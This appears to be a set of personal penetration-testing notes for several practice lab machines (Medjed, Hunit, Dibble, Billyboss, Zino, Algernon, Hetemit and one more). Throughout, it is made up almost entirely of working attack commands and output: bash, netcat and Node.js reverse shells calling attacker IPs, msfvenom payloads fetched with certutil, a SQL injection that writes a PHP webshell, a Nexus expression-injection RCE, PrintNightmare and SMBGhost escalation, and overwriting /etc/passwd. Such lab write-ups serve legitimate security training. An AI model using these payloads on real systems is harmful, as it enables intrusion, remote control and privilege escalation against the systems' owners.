>/LINKS
>/ADMIN
	10:25 -!- Administrative info for irc.madcowz.localdomain
	10:25 -!- Name     - Fluffy Cow
	10:25 -!- Nickname - Fluffy
	10:25 -!- E-Mail   - fluffycow@localdomain
>/LIST
	10:30 -!- #ut99 1 [+nt] Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
>/NAMES #ut99
	@daisy
>/whois daisy
	01:59 -!- daisy [daisy@localhost.offseclabs.com]
	01:59 -!-  ircname  : realname
	01:59 -!-  channels : @#ut99
>/whowas daisy
>/JOIN ut99
	02:02 -!- Topic for #ut99: Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
	02:02 -!- Topic set by daisy [daisy@localhost.offseclabs.com] [Sun Nov  7 01:59:07 2021]
	#there are only 1 active user (daisy) and information about Unreal Tournament 99 on port 7779
	#first I though that is irc port to connect on channel ut99 
searchsploit unreal tournament
	Unreal Tournament - Remote Buffer Overflow (SEH)                | windows/remote/16145.pl
	#https://www.exploit-db.com/exploits/16145
perl 16145.pl 192.168.97.44 7778 192.168.49.97 80
rlwrap nc -lvp 80
>whoami
	fluffy-pc\daisy
	#I tried to run winpeas got stuck on shell and had to revert the box
	#I try to run another .exe exploit got hang again
	#this box has weird behaviour handling exe file
	#find www directory
> cd \
>dir /a:d /b /s public_html
	C:\xampp\htdocs\public_html
>type config.php
	$dbname = 'madcows';
	$dbuname = 'madcows';
	$dbpass = 'madcows';
>dir \ftp
	10/07/2015  01:44 PM        35,984,520 FoxitReader706.1126_enu_Setup.exe
searchsploit foxit reader 7.0
	Foxit Reader 7.0.6.1126 - Unquoted Service Path Privilege Escalation	| windows/local/36390.txt
	#https://www.exploit-db.com/exploits/36390
	#exploit foxit reader unquoted path
	#manual search unquoted path
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
	Foxit Clo...		FoxitCloudUpdateService         C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe          Auto
	...C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe...
	#check permission service
sc qc FoxitCloudUpdateService
	START_TYPE         : 2   AUTO_START
	#no start stop permission, but autostart service when reboot or startup
accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\Foxit Software"
	RW fluffy-pc\daisy
icacls "C:\Program Files (x86)\Foxit Software"
	fluffy-pc\daisy:(OI)(CI)(NP)(W,Rc,REA,RA)
	#has write access
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.74 LPORT=80 -f exe -o rshell.exe
>certutil -urlcache -split -f http://192.168.49.74/rshell.exe
>copy rshell.exe Foxit.exe
>dir /b /s | findstr Foxit.exe
	C:\Program Files (x86)\Foxit Software\Foxit.exe
	#reboot /r reboot /f force /t wait time
>shutdown.exe -r -f -t 1
>shutdown /r /f /t 5
	#after read writeup, we can shutdown and append exit to make program doesn't crash
>shutdown /r /f /t 5 && exit
nc -lvp 80
>whoami
	nt authority\system
	#after read writeup there are another privesc
	#IKEEXT dll hijack dll (IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) - Missing DLL.)
>powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.169/rev.ps1')
nc -lvp 53
>IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.169/PowerUp.ps1')
	#try to detect IKEEXT dll hijack but all enumeration script didn't work
>sc query IKEEXT
	STATE		: 4  RUNNING
	(STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
	#search  wlbsctrl.dll may exist
>dir wlbsctrl.dll /s /b /a
	#check system path
>PATH
	PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
	#C:\Python\Scripts\;C:\Python\ may be injectable
>icacls C:\Python\
	BUILTIN\Users:(I)(OI)(CI)(RX)
>icacls C:\Python\Scripts\
	BUILTIN\Users:(I)(OI)(CI)(RX)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.169 LPORT=80 -f dll -o wlbsctrl.dll
>copy \temp\wlbsctrl.dll .
>shutdown /r /f /t 5 && exit
nc -lvp 80
>whoami
	nt authority\system









Medjed ProvingGrounds
=========================================
sudo autorecon 192.168.131.127
cat fullnmap
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3306/tcp  open  mysql?
	5040/tcp  open  unknown
	7680/tcp  open  pando-pub?
	30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
	33033/tcp open  unknown
	44330/tcp open  ssl/unknown
	45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
	45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
ftp -p 192.168.131.127 30021
>dir
	-r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
	-r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
	-r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
	-r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
	-r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
	-r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
	drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
	#ruby web directory, but no write access and no credential inside config and app
http://192.168.131.127:33033/
	#ruby web service
http://192.168.131.127:33033/jembotkuro
	Rails.root: C:/Sites/userpro
	slugreq_path 	GET 	/slug(.:format) 	slug#index
	#as always 404 reveals some information on ruby costruction
	#service running in C:\Sites\userpro\ and there are /slug request
http://192.168.131.127:33033/slug
	<Mysql2::Result:0x000000000a62a8e0> 
	URL:
	#try to put my machine as url but didn't catch anything
http://192.168.131.127:33033/slug/URL=''
	Mysql2::Error: You have an error in your SQL syntax
	sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
	#reveal sql query syntax that vulnerable to sql injection
	#since I'm weak on sqli I pass it because I found another way in
https://192.168.131.127:44330
https://192.168.131.127:44330/Config-Wizard/wizard/SetAdmin.lsp
	Set Administrator Account
	#somehow website redirect to set administrator account, so I fill it then loged in
https://192.168.131.127:44330/rtl/about.lsp
	BarracudaDrive 6.5
	#search vulnerability online there are exploit to priviledge escalation, so I skip it
	#lookup on Web-File-Server I can upload webshell on target
https://192.168.131.127:44330/rtl/protected/wfslinks.lsp
	File Server Links	Access Rights
	/fs/				read - write
https://192.168.131.127:44330/fs/
https://192.168.131.127:44330/fs/C/xampp/htdocs/
	index.html	887		2020-11-03 14:13
	phpinfo.php	21		2020-11-03 14:16
	script.js	3023	2020-11-03 14:13
	styles.css	1266	2020-11-03 14:14
http://192.168.131.127:45443/phpinfo.php
	#yes that is valid webserver on port 45443
	#so I upload php webshell, and got reverse shell
http://192.168.131.127:45443/p0wny.php
	copy \\192.168.49.131\asd\nc.exe .
	nc.exe 192.168.49.131 3306 -e cmd.exe
impacket-smbserver asd . -smb2support
rlwrap nc -lvp 3306
>whoami
	medjed\jerren
	#as I mention before there are priviledge escalation on baracuda so I try it
	#BarracudaDrive 6.5 Local Privilege Escalation
	#https://packetstormsecurity.com/files/158812/BarracudaDrive-6.5-Local-Privilege-Escalation.html
>cacls C:\bd
	BUILTIN\Users:(OI)(CI)(ID)R
	NT AUTHORITY\Authenticated Users:(ID)C
	NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
>cacls C:\bd\bd.exe
	BUILTIN\Users:(ID)R
	NT AUTHORITY\Authenticated Users:(ID)C
	#check autorun service (?)
>get-service "bd" | fl *
	DisplayName         : BarracudaDrive ( bd ) service
	StartType           : Automatic
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.131 LPORT=3306 -f exe > rshell.exe
>copy \\192.168.49.131\asd\rshell.exe .
>cd C:\bd
>move bd.exe bd.service.exe
>mode \temp\rshell.exe bd.exe
>shutdown /r /f /t 5
	#rebooted and start listener
rlwrap nc -lvp 3306
>whoami
	nt authority\system
	#I did second privesc using printnightmare since I saw win 10
	#Printnightmare windows 10 pro privesc
>whoami
	medjed\jerren
>systeminfo
	OS Name:                   Microsoft Windows 10 Pro
	OS Version:                10.0.18363 N/A Build 18363
>REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
>powershell
>Get-Service -Name Spooler
	Status   Name               DisplayName
	------   ----               -----------
	Running  Spooler            Print Spooler
>copy \\192.168.49.131\asd\SharpPrintNightmare.exe .
>copy \\192.168.49.131\asd\rev.dll .
>SharpPrintNightmare.exe C:\temp\rev.dll
rlwrap nc -lvp 3306
>whoami
	nt authority\system
	#after read walktrough this is not the itended path
	#sqli write file
	sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
	sql = "SELECT username FROM users WHERE username = '' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -''"
http://192.168.120.132:33033/slug?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
http://192.168.131.127:33033/slug?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
	URL=' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
	#request got no error means, sql query are success
curl http://192.168.131.127:45443/cmd.php?cmd=whoami
	medjed\jerren
curl http://192.168.131.127:45443/cmd.php?cmd=\\192.168.49.131\asd\rshell.exe
curl 'http://192.168.131.127:45443/cmd.php?cmd=\\192.168.49.131\asd\rshell.exe
>whoami
	medjed\jerren
	#there are another working reverse shell using ruby one someone walktrough
	#but when I tried failed so I moved on





Hunit ProvingGrounds
=========================================
sudo autorecon 192.168.169.125
cat fullnamp
	12445/tcp open  netbios-ssn Samba smbd 4.6.2
	18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
	8080/tcp open  http        Apache httpd 2.4.46 ((Unix))
	43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
http://192.168.150.125:18030/
	#whack a mole game
	#https://github.com/drood87/whack-a-mole
	#nothing usefull
http://192.168.150.125:8080/
http://192.168.150.125:8080/article/the-taste-of-rain
	#haikus (poet in japansese)
gobuster dir -u http://192.168.169.125:8080/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .html,.php,.txt
gobuster dir -u http://192.168.169.125:8080/ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --timeout 100s -t 50 -b 404,400
	#404 whitelable error, atr to exploit it but no url valid
	#https://www.fatalerrors.org/a/exploit-spring-boot-related-exploit-check-list.html
view-source:http://192.168.150.125:8080/article/the-taste-of-rain
	<a href="http://localhost:8080/api/">List all</a>
	#found list api
	#bruteforce api
wfuzz -c -w /opt/directory-list-2.3-medium.txt  --hc 404 http://192.168.169.125:8080/FUZZ/
http://192.168.150.125:8080/api/
	"/user/"
wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt  --hc 404 http://192.168.169.125:8080/user/FUZZ
wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt  --hc 404 -X POST http://192.168.169.125:8080/user/FUZZ
wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt --hc 404 http://192.168.169.125:8080/user/FUZZ/
wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt  --hc 404 -X POST http://192.168.169.125:8080/user/FUZZ
	#nothing found
http://192.168.169.125:8080/api/user/
	#got lisst of users
hydra -L user.txt -P pass.txt -s 43022 192.168.169.125 ssh
	#nothing found, try verbose mode found out only can handle one request (?)
hydra -L user.txt -P pass.txt -s 43022 -t 1 -T 1 192.168.169.125 ssh -v
	[43022][ssh] host: 192.168.150.125   login: dademola   password: ExplainSlowQuest110
ssh -p 43022 dademola@192.168.169.125
scp -P 43022 linpeas.sh dademola@192.168.169.125:~/
>whoami
	dademola
>bash linpeas.sh | tee dademola-hunit-linpeas.txt
	*/3 * * * * /root/git-server/backups.sh
	*/2 * * * * /root/pull.sh
	#there are cron job for root to pull from git-server and run backup.sh
>find / -type d 2>/dev/null | grep git-server
>cd /git-server
	#basicly if I can edited branch then push branch to master (root directory), root will execute basckup.sh
	#found git private key also
>ls /home/git/.ssh/
	authorized_keys  id_rsa  id_rsa.pub
	#try to working on git-shell
ssh -p 43022 -i rootid_rsa git@192.168.169.125 -t "git-receive-pack '--help'"
ssh -p 43022 -i rootid_rsa git@192.168.169.125
	#nothing usefull
	#since idk much about git so I open up walktrough to do that push that I mention before
	#git clone from local, git clone local
>git clone file:///git-server/ 
>git log
	commit 8c0bc9aa81756b34cccdd3ce4ac65091668be77b
	Author: Dademola <dade@local.host>
	#there are history dademola git push commit
>cat backup.sh
	/tmp/rev.sh
	sh -i >& /dev/tcp/192.168.49.150/12445 0>&1
>chmod +x backups.sh
	#push to master
>git config --global user.name "dademola"
>git config --global user.email "dademola@hunit.(none)"
>git add -A
>git commit -m jembot
>git push
	! [remote rejected] master -> master (unpacker error)
	error: failed to push some refs to 'file:///git-server'
	#error, so try with git user
chmod 600 gitid_rsa
GIT_SSH_COMMAND='ssh -i gitid_rsa -p 43022' git clone git@192.168.150.125:/git-server
cd git-server
git config --global user.name "kali"
git config --global user.email "kali@kali.(none)"
>cat backup.sh
	/tmp/rev.sh
	sh -i >& /dev/tcp/192.168.49.150/12445 0>&1
chmod +x backups.sh
git add -A
git commit -m "jembot"
GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
	654e1da..0b50d71  master -> master
nc -lvp 12445
#whoami
	root











Dibble ProvingGrounds
=================================
sudo autorecon 192.168.150.110
cat fullnmap
	21/tcp    open  ftp     vsftpd 3.0.3
	22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
	80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
	3000/tcp  open  http    Node.js (Express middleware)
	27017/tcp open  mongodb MongoDB 4.2.9
http://192.168.169.110/
	#drupal 9, scan drupal
droopescan scan drupal -u http://192.168.150.110
	#got nothing
nmap -sV --script "mongo* and default" -p 27017 192.168.150.110 -oN mongo.nmap
	#mongo seems allowed anonymous to login
	#install mongo
	#https://techstarspace.engineer/2020/03/10/install-mongodb-on-kali-2020/
mongo mongodb://192.168.169.110:27017
	#enumerate mongo
>show dbs
	account-app  0.000GB
	admin        0.000GB
	config       0.000GB
	local        0.000GB
>show tables
	logmsg
	users
>db.users.find().pretty()
	"username" : "administrator",
	"password" : "ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac",
	#got administrator hash, but I can't crack it and looklike sha2 256 but when I generate my own hash and replace it failed
cewl -w asd.txt -d 10 -m 3 --with-numbers http://192.168.150.110:3000/logs/all
john hash.txt --wordlist=/opt/rockyou.txt
john hash.txt --wordlist=/opt/rockyou.txt --format=Raw-SHA256
	#replace mongodb data, insert mongo
	#https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/mongodb/mongodb_hacking.md
>db.table_name.update({"key_list" : "value key_list"},{$set: {"key_list want to update" : "value update"}})
>db.users.update({"username" : "administrator"},{$set: {"password" : "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}})
http://192.168.169.110:3000
	#node js web applications
	#I can login as administrator but I can't input anything on website
	#there are cache ZGVmYXVsdA== as default, I change to administrator still got nothing
	#gave up and open up a walktrough then my mistake I should change to admin not administrator
http://192.168.169.110:3000/logs
POST /logs/new HTTP/1.1
Cookie: connect.sid=s%3AaL...MUMuv0Aw; userLevel=ZGVmYXVsdA==
	#failed
echo "ZGVmYXVsdA==" | base64 --decode
	default
	#weak authentication
POST /logs/new HTTP/1.1
Cookie: connect.sid=s%3AaL...MUMuv0Aw; userLevel=YWRtaW4=
	#success and now I can read something on website
	#SSJS (server side javasript), there are no much reverence
	#https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html
	#https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
	#https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
http://192.168.169.110:3000/logs/new
	1+1
	#and output will be 2, first I though wll be ssti but no
http://192.168.169.110:3000/logs/all
	2
http://192.168.169.110:3000/logs/new
	(function(){return 2+2;})();
	#also accept fuctions, walktrough said it proceed using eval()
	#file read
	require('fs').readdirSync('.').toString()
	#nodejs rce
http://192.168.169.110:3000/logs
	require("child_process").exec('wget 192.168.49.169/passwd.txt')
	require("child_process").exec('bash -i >& /dev/tcp/192.168.49.169/80 0>&1')
	(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(80, "192.168.49.169", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
	#another reverse shell with encoding to make simple in case payload need to fit in url
	#https://string-functions.com/string-hex.aspx
	;eval(new Buffer('PAYLOAD', 'hex').toString();//*
	eval(new Buffer('PAYLOAD', 'hex').toString()
	eval(new Buffer('2866756e6374696f6e28297b0d0a20202020766172206e6574203d207265717569726528226e657422292c0d0a20202020202020206370203d207265717569726528226368696c645f70726f6365737322292c0d0a20202020202020207368203d2063702e737061776e28222f62696e2f7368222c205b5d293b0d0a2020202076617220636c69656e74203d206e6577206e65742e536f636b657428293b0d0a20202020636c69656e742e636f6e6e6563742838302c20223139322e3136382e34392e313639222c2066756e6374696f6e28297b0d0a2020202020202020636c69656e742e706970652873682e737464696e293b0d0a202020202020202073682e7374646f75742e7069706528636c69656e74293b0d0a202020202020202073682e7374646572722e7069706528636c69656e74293b0d0a202020207d293b0d0a2020202072657475726e202f612f3b202f2f2050726576656e747320746865204e6f64652e6a73206170706c69636174696f6e20666f726d206372617368696e670d0a7d2928293b', 'hex').toString())
nc -lvp 80
>whoami
	benjamin
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp
	#cp privesc suid cp suid
cat passwd.txt
	rooot:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:0:0:root:/root:/bin/bash
>wget 192.168.49.169/passwd.txt
>cp passwd.txt /etc/passwd
>su rooot
#whoami
	root








Billyboss ProvingGrounds
=========================================
sudo autorecon 192.168.68.61
cat fullnmap
	21/tcp   open  ftp     Microsoft ftpd
	80/tcp   open  http    Microsoft IIS httpd 10.0
	8081/tcp open  http    Jetty 9.4.18.v20190429
ftp 192.168.68.61 -u anonymous
	Login failed: 534 Policy requires SSL.
	#login ftp with ssl
lftp -d ftp://anonymous@192.168.68.61:21
>set ftp:ssl-allow true
>ls
	534 Local policy on server does not allow TLS secure connections
	#still got error, looking up online someone said the one who should fix is on server side
http://192.168.68.61/
	#baget, idk what it is but seems there are no vulnerability and I can make any input
http://192.168.68.61:8081
	Sonatype Nexus Repository Manager OSS 3.21.0-05
wfuzz -c -w /opt/directory-list-lowercase-2.3-medium.txt  --hh 2166 http://192.168.68.61/v3/FUZZ.json
gobuster dir -u http://192.168.68.61:8081/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .html,.php,.txt
	#exploit nexus 3.21
	#https://www.exploit-db.com/exploits/49385
	#to get rce need credentials, I can't find any credentials I thought will get from ftp but no
	#openup walktrough the credentials nexus:nexus
python3 49385.py
	Error executing command, the following was returned by Nexus
	#got error, find another reference and exploit got this usefull article
	#https://www.cxybb.com/article/caiqiiqi/105276047
msfvenom -a x64 -p windows/shell_reverse_tcp LHOST=192.168.49.78 LPORT=21 -f exe > rshell.exe
cat 49385.py
	proxies = {'http': 'http://127.0.0.1:8080'}
	s = requests.Session()
	s.proxies.update(proxies)
	r = s.post(URL + '/service/rest/repository/browse/maven-public/', json=body)
POST /service/rest/beta/repositories/go/group HTTP/1.1
{ "name": "internal", "online": "true", "storage": { "blobStoreName": "default", "strictContentTypeValidation": "true" }, "group": { "memberNames": [ "$\\A{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('calc')}" ] } }
...exec('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.49.68/rshell.exe')}"...
	#got rce and trigger reverse shell
POST /service/rest/beta/repositories/go/group HTTP/1.1
...exec('rshell.exe')}"...
nc -lvp 21
>whoami
	billyboss\nathan
>systeminfo
	OS Name:                   Microsoft Windows 10 Pro
	OS Version:                10.0.18362 N/A Build 18362
	#printnighmare privesc, add localgroup are failed, rev.dll are success
>REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
>powershell
>Get-Service -Name Spooler
	Status   Name               DisplayName                           
	------   ----               -----------                           
	Running  Spooler            Print Spooler
msfvenom -p windows/x64/exec cmd='net localgroup administrators billyboss /add' --platform windows -f dll > add.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.68 LPORT=21 -f dll -o rev.dll
>certutil -urlcache -split -f http://192.168.49.68/SharpPrintNightmare.exe
>certutil -urlcache -split -f http://192.168.49.68/rev.dll
>SharpPrintNightmare.exe C:\temp\rev.dll
nc -lvp 21
>whoami
	nt authority\system
	#smbghost privesc CVE-2020-0796 windows 10 pro
	#https://github.com/danigargu/CVE-2020-0796
>wmic qfe list
	http://support.microsoft.com/?kbid=4552152  BILLYBOSS  Security Update	KB4552152	NT AUTHORITY\SYSTEM  5/26/2020
	http://support.microsoft.com/?kbid=4540673  BILLYBOSS  Update			KB4540673	BILLYBOSS\nathan     5/27/2020
	#https://www.windowslatest.com/2020/03/12/windows-10-kb4551762/
git clone https://github.com/danigargu/CVE-2020-0796
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.68 LPORT=80 -f dll -f csharp
	#change exploit.ccp with my payload and compile with visual studio
>certutil -urlcache -split -f http://192.168.49.68/cve-2020-0796-local.exe
>cve-2020-0796-local.exe
	Success! ;)
nc -lvp 80
>whoami
	nt authority\system









Zino ProvingGrounds
==========================================
sudo autorecon 192.168.60.54
cat fullnmap
	21/tcp   open  ftp         vsftpd 3.0.3
	22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	3306/tcp open  mysql?
	8003/tcp open  http        Apache httpd 2.4.38
hydra -L /opt/user.txt -e nsr  192.168.60.64 ftp -t 1 -T 1
	#ftp got nothing
cat smbmap-share-permissions.txt
	zino			READ ONLY       Logs
smbclient \\\\192.168.60.64\\zino
>prompt OFF
>recurse ON
>mget *
cat misc.log
	Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
	Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
	#got credz admin:adminadmin can use to login web service
http://192.168.60.64:8003/booked/
	#Booked Scheduler 2.7.5 RCE without metasploit
	#https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
http://192.168.60.64:8003/booked/Web/admin/manage_theme.php
	Upload favicon.ico remove, upload webshell.php file without temper
http://192.168.60.64:8003/booked/Web/custom-favicon.php
	bash -c 'bash -i >& /dev/tcp/192.168.49.60/21 0>&1'
>whoami
	www-data
>bash winpeas.sh | tee www-zico-winpeas.txt
	*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
	#change cleanup.py to rev.py
>cat cleanup.py
	os.system("echo 'rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash' > /etc/passwd");
>watch cat /etc/passwd
>su rooot
#whoami
	rooot










Algernon ProvingGrounds
==========================================
sudo autorecon 192.168.60.65
cat fullnmap
	21/tcp    open  ftp           Microsoft ftpd
	80/tcp    open  http          Microsoft IIS httpd 10.0
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	9998/tcp  open  http          Microsoft IIS httpd 10.0
	17001/tcp open  remoting      MS .NET Remoting services
ftp -p 192.168.60.65
>ls
	#ftp hang even with passive mode
cat smbmap-share-permissions.txt
	#smb required login
rpcclient -U "" 192.168.60.65 -N
	#rcp nothing
cat tcp_80_http_dirb.txt
http://192.168.60.65/
	#default IIS
http://192.168.60.65:9998/interface/root#/login
	#windows smartermail exploit RCE
searchsploit smartermail
	SmarterMail Build 6985 - Remote Code Execution		| windows/remote/49216.py
cat 49216.py
	HOST='192.168.60.65'
	PORT=17001
	LHOST='192.168.49.60'
	LPORT=21
	#target port 17001 and its open, maybe this is the way in
python3 49216.py
	SyntaxError: invalid non-printable character U+200B
	#got error
sed 's/\xe2\x80\x8b//g' 49216.py > ex.py
python3 ex.py
rlwrap nc -lvp 21
>whoami
	nt authority\system









Hetemit Proving Grounds
======================================
sudo autorecon 192.168.209.117
cat fullnamp
	21/tcp    open  ftp         vsftpd 3.0.3
	22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
	80/tcp    open  http        Apache httpd 2.4.37 ((centos))
	139/tcp   open  netbios-ssn Samba smbd 4.6.2
	445/tcp   open  netbios-ssn Samba smbd 4.6.2
	18000/tcp open  biimenu?
	50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
ftp -p 192.168.209.117
	#ftp hang as always
http://192.168.209.117
	#default apache
http://192.168.209.117:18000
	#protomba using ruby rails
http://192.168.226.117:18000/nodesntexist
	No route matches [GET] "/nodesntexist"
	Rails.root: /home/cmeeks/register_hetemit
	rails_disk_service_path 	GET 	/rails/active_storage/disk/:encoded_key/*filename(.:format)	active_storage/disk#show
	#404 error leake some information, rails active storage there are rce but I tried and didn't work or just rabbit hole
	#https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
	#https://github.com/omarkurt/CVE-2019-5418
http://192.168.209.117:50000
	{'/generate', '/verify'}
	#https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug
	#if console exist I can't get rce, but console are disabled
	#interact with API, I change header added Accept: application/json
	#https://documenter.getpostman.com/view/5881845/RzfZQDXe
http://192.168.209.117:50000/verify
POST /verify HTTP/1.1
Accept: application/json
code=id
	#bruteforce api bruteforce
wfuzz -c -X POST -w /opt/rockyou.txt -H "accept: application/json" http://192.168.209.117:50000/verify?code=FUZZ
wfuzz -c -X POST -w /opt/rockyou.txt -H "accept: application/json" --hc 400 -u "http://192.168.209.117:50000/verify" -d "code=FUZZ"
	#found something, use better object
wfuzz -c -X POST -w /opt/SecLists/Discovery/Web-Content/api/objects.txt -H "accept: application/json" --hc 400 -u "http://192.168.209.117:50000/verify" -d "code=FUZZ"
	000001265:   200        0 L      4 W        47 Ch       "os"
	000001388:   200        0 L      3 W        25 Ch       "print"
wfuzz -c -X POST -w /opt/SecLists/Discovery/Web-Content/api/objects.txt  -H "Accept: application/json" --hc 400,500 -u "http://192.168.68.117:50000/verify" -d "code=FUZZ"
curl -X POST "http://192.168.68.117:50000/verify" -H "accept: application/json" -d 'code=os'
	<module 'os' from '/usr/lib64/python3.6/os.py'>
curl -X POST "http://192.168.68.117:50000/verify" -H "accept: application/json" -d 'code=7*7'
	49
	#I though I will be SSTI just like this case
	#https://ctftime.org/writeup/10895
	#but that was python print functions, I tried on my kali
python
>>> print (7*7)
	49
>>> import os
>>> print (os)
	<module 'os' from '/usr/lib/python2.7/os.pyc'>
>>> os.system('whoami')
	kali
	0
curl -X POST "http://192.168.68.117:50000/verify" -H "accept: application/json" -d 'code=os.system("whoami")'
	0
curl -X POST "http://192.168.68.117:50000/verify" -H "accept: application/json" -d 'code=os.system("ping -c 4 192.168.49.68")'
sudo tcpdump -i tun0 icmp
	#reverse shell
curl -X POST "http://192.168.68.117:50000/verify" -H "accept: application/json" -d 'code=os.system("nc -e /bin/bash 192.168.49.68 80")'
>whoami
	cmeeks
	#check another application may has some credential
>cd /home/cmeeks/register_hetemit/config
>cat database.yml
	database: register_hetemi
	username: railsdev
	password: OpenProduceTreat153
	#enumerate postgresql
	#https://book.hacktricks.xyz/pentesting/pentesting-postgresql
>psql -U railsdev -d register_hetemit
>\list
	postgres         | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
	register_hetemit | railsdev | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
>\c register_hetemit
>\d
	...
	public | users                             | table    | railsdev
	#read table pgsql
	#https://stackoverflow.com/questions/26040493/how-to-show-data-in-a-table-by-using-psql-command-line-interface
>table users;
>select * from users;
	id | email | username | password_digest | picture | created_at | updated_at | invite_code
	----+-------+----------+-----------------+---------+------------+------------+-------------
	(0 rows)
